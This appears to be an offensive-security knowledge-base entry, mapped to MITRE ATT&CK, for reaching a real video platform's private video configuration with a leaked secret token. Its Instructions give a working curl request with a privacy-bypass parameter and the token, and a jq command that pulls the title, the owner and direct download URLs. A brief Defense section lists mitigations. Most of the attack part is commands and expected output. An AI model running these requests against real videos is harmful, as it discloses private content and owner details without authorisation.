---
id: 123e4567-e89b-12d3-a456-426614174003
name: Access-Private-Video-Config-with-Leaked-Token
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:57.198Z'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Valid Accounts]]'
  - '[[Data from Cloud Storage]]'
sub_techniques: []
tags:
  - information-disclosure
  - token-leak
commands: []
platforms:
  - Web
tools:
  - '[[tools/videoLeak-php]]'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Data from Cloud Storage]]'
---

# Access-Private-Video-Config-with-Leaked-Token

## Summary

This procedure uses the extracted secret token to request the private video's config endpoint, bypassing privacy checks and retrieving JSON with metadata and file links.

## Description

The config endpoint at https://player.vimeo.com/video/[VIDEO_ID]/config relies solely on the 's' token for access, without re-validating permissions. Append the token and standard player parameters to fetch sensitive data. This step assumes token from prior procedure and targets cloud-hosted video configs. Outcome is full disclosure of private details.

## Requirements

1. Valid secret token from extraction
2. Target video ID
3. HTTP client supporting query parameters

## Defense

Defensive measures and detection strategies:

- Enforce permission re-checks on config endpoints beyond tokens
- Expire tokens quickly and bind to sessions
- Detect anomalous config requests from non-player contexts

## Objectives

1. Fetch video config JSON
2. Extract metadata and file URLs
3. Confirm bypass success

## Instructions

### Step 1: Construct and Send Config Request

**Context**: Build URL with token and player params to simulate legitimate access.

**Command** (curl-access-config):
```bash
curl -X GET "https://player.vimeo.com/video/[VIDEO_ID]/config?autoplay=0&byline=0&bypass_privacy=1&context=Vimeo%5CController%5CClipController.main&default_to_hd=1&portrait=0&title=0&s=[SECRET]" -v
```

> Replaces [VIDEO_ID] and [SECRET]; expected JSON with 'video' object containing title, owner, and 'request' with files array.

### Step 2: Parse JSON Response

**Context**: Extract key fields from the returned data.

Use jq or manual parse:
```bash
curl ... | jq '.video.title, .video.owner.name, .request.files.progressive[] | .url'
```

> Outputs title, owner, and download URLs.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Valid Accounts]] Valid Accounts
- [[Data from Cloud Storage]] Data from Cloud Storage

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/videoLeak-php]]

## Tags

- [[information-disclosure]]
- [[token-leak]]
